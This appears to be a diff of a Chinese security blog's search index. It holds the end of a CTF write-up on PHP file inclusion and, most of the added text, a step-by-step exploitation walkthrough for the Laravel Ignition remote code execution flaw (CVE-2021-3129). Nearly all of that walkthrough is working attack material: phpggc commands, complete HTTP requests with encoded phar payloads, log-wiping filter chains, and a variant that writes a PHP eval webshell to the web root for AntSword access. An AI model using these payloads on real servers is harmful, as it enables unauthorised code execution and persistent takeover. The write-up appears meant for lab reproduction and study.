-<p>在这道题中，我们就可以通过构造这样的语句查看隐藏的代码，如下网址:</p>
-<p><img src="https://i.imgur.com/5m2c8p5.png" alt=""></p>
-<p>然后在进行base64解码得到flag</p>
-<p>flag:nctf{edulcni_elif_lacol_si_siht}</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-        <tag>文件包含</tag>
-        <tag>LFI</tag>
-        <tag>CTF</tag>
-        <tag>php://filter</tag>
       </tags>
   </entry>
   <entry>
@@ -1023,6 +746,202 @@ Bar
       </tags>
   </entry>
   <entry>
+    <title>Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</title>
+    <url>/2023/01/17/Laravel%20Ignition%202.5.1%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-3129%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Laravel是一个由Taylor Otwell所创建，免费的开源 PHP Web 框架。</p>
+<blockquote>
+<p>Laravel Ignition 是一个强大的错误和异常处理工具，它能够提供更好的错误诊断和调试体验，为 Laravel 的错误页面提供了更友好和可读性更强的设计</p>
+</blockquote>
+<a id="more"></a>
+<p>在开发模式下，Laravel使用了Ignition提供的错误页面，在Ignition 2.5.1及之前的版本中，有类似这样的代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$contents = file_get_contents($parameters[&apos;viewFile&apos;]);   #序列化</span><br><span class="line">file_put_contents($parameters[&apos;viewFile&apos;], $contents);    #反序列化</span><br></pre></td></tr></table></figure>
+<p>Laravel &lt;= 8.4.2 存在远程代码执行漏洞，当Laravel开启了Debug模式时，由于Laravel自带的2.5.2之前的Ignition功能的某些接口和函数存在过滤不严，未经过身份验证的远程攻击者可以发起恶意请求，通过<strong>构造恶意Log文件等方式触发phar反序列化，从而造成远程代码执行</strong>，控制服务器。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></li>
+<li><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></li>
+<li><a href="https://www.freebuf.com/vuls/280416.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/280416.html</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1797520" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1797520</a></li>
+</ul>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Laravel&lt;=8.4.2</span><br><span class="line">Ignition&lt;2.5.2</span><br></pre></td></tr></table></figure>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个运行着Laravel 8.4.2和Ignition 2.5.1的应用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+<p>环境启动后，访问<code>http://your-ip:8080</code>即可查看Laravel默认的欢迎页面。</p>
+<p><img src="/images/image-20230910194259406.png" alt="image-20230910194259406"></p>
+<p>点击<strong>Generate app key</strong>生成应用程序密钥<br>至此环境搭建完成</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>想要利用该漏洞需要有几个步骤：</p>
+<p>利用phpggc生成对应的phar文件→清空laravel.log → Log中增加前缀（填充字符，用于对齐），使得最终只出现一次 payload→将编码后的phar文件写入到log中→清除干扰字符→执行phar反序列化</p>
+<p><strong>验证漏洞是否存在</strong></p>
+<p>burpsuite抓取一个数据包，按照下图的形式修改并发送数据包</p>
+<p><img src="/images/image-20230910195124699.png" alt="image-20230910195124699"></p>
+<p>页面出现了Ignition的报错，说明漏洞存在，且开启了debug模式。</p>
+<p><strong>Laravel Debug mode RCE漏洞利用</strong></p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>一、利用phpggc生成对应的phar文件</p>
+<p>通过在laravel的依赖里面找一条能够rce的链，生成对应的phar文件，并将phar文件base64编码，再将该base64编码后的字符进行convert.quoted-printable-encode编码</p>
+<p>工具下载地址：git clone <a href="https://github.com/ambionics/phpggc.git" target="_blank" rel="noopener">https://github.com/ambionics/phpggc.git</a></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">php -d <span class="string">"phar.readonly=0"</span> ./phpggc/phpggc Laravel/RCE5 <span class="string">"phpinfo();"</span> --phar phar -o php:<span class="comment">//output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910200353296.png" alt="image-20230910200353296"></p>
+<p>得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：</p>
+<p><img src="https://img-blog.csdnimg.cn/dd8b1da0ee1046fb8a9ddb7a00e1c9be.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>二、清空laravel.log</p>
+<p>使用php://filter中的convert.base64-decode过滤器的特性，将log清空。</p>
+<p>发送如下数据包，将Laravel的原日志文件laravel.log清空：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910200633460.png" alt="image-20230910200633460"></p>
+<p>三、发送如下数据包，给Log增加一次前缀</p>
+<blockquote>
+<p><strong>如果出现两次 payload 或者出现部分残留的base64编码允许的字符将影响后续的base64解码</strong>。 可以通过在前后通过加填充字符的方式来调整 payload 的第一个字符下标为奇数 or 偶数，从而影响 utf16-&gt;utf8 的解码，来使得最终只出现一次 payload</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910200805099.png" alt="image-20230910200805099"></p>
+<p>四、将编码后的字符写入到log中</p>
+<p>将之前生成的编码后的POC作为viewFile的值，发送数据包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5058</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=2B=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=48=00=4B=00=77=00=2F=00=57=00=51=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=45=00=44=00=33=00=75=00=36=00=2F=00=44=00=48=00=65=00=41=00=44=00=33=00=72=00=78=00=79=00=57=00=47=00=6E=00=46=00=34=00=6E=00=58=00=49=00=75=00=49=00=6D=00=43=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910201007691.png" alt="image-20230910201007691"></p>
+<p><img src="/images/image-20230910201656301.png" alt="image-20230910201656301"></p>
+<p>五、清空干扰字符只留下我们生成的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910201424924.png" alt="image-20230910201424924"></p>
+<p><strong>tips:</strong> 这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试</p>
+<p>六、触发phar反序列化</p>
+<p>使用phar://进行反序列化，执行任意代码（<strong>此时需要使用绝对路径</strong>）：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 210</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",</span></span><br><span class="line"><span class="comment">  "parameters": &#123;</span></span><br><span class="line"><span class="comment">    "variableName": "username",</span></span><br><span class="line"><span class="comment">    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910202053862.png" alt="image-20230910202053862"></p>
+<h4 id="蚁剑连接webshell"><a href="#蚁剑连接webshell" class="headerlink" title="蚁剑连接webshell"></a>蚁剑连接webshell</h4><p>我们可以利用该漏洞<strong>写入Webshell</strong>：</p>
+<p>1.利用phpggc生成对应的phar文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -d &quot;phar.readonly=0&quot; ./phpggc/phpggc Laravel/RCE5 &quot;system(&apos;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&apos;);&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&apos;&apos;.join([&apos;=&apos; + hex(ord(i))[2:] + &apos;=00&apos; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910202642109.png" alt="image-20230910202642109"></p>
+<p><img src="/images/image-20230910203108274.png" alt="image-20230910203108274"></p>
+<p>重复上述利用步骤后，即可连接Webshell ！</p>
+<p>2.清除laravel.log</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>3.给Log增加一次前缀<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>4.编码后的phar文件写入到log中<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=52=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=62=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=63=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=67=00=6E=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=51=00=52=00=44=00=6C=00=33=00=59=00=55=00=68=00=42=00=5A=00=31=00=70=00=59=00=57=00=6D=00=68=00=69=00=51=00=32=00=64=00=72=00=57=00=44=00=46=00=43=00=55=00=46=00=55=00=78=00=55=00=6D=00=4A=00=6B=00=4D=00=6D=00=68=00=32=00=57=00=56=00=63=00=78=00=63=00=46=00=68=00=54=00=61=00=7A=00=64=00=51=00=65=00=6A=00=51=00=39=00=66=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=49=00=43=00=39=00=32=00=59=00=58=00=49=00=76=00=64=00=33=00=64=00=33=00=4C=00=32=00=68=00=30=00=62=00=57=00=77=00=76=00=63=00=32=00=68=00=6C=00=62=00=47=00=77=00=75=00=63=00=47=00=68=00=77=00=4A=00=79=00=6B=00=37=00=49=00=47=00=56=00=34=00=61=00=58=00=51=00=37=00=49=00=44=00=38=00=2B=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=41=00=4C=00=66=00=39=00=5A=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=33=00=4E=00=42=00=31=00=67=00=64=00=5A=00=36=00=2B=00=50=00=59=00=72=00=34=00=36=00=79=00=42=00=34=00=71=00=67=00=63=00=67=00=4F=00=4C=00=74=00=59=00=37=00=77=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>5.清除干扰字符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>6.执行反序列化<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发送完以上数据包后，蚁剑进行连接，成功连接</p>
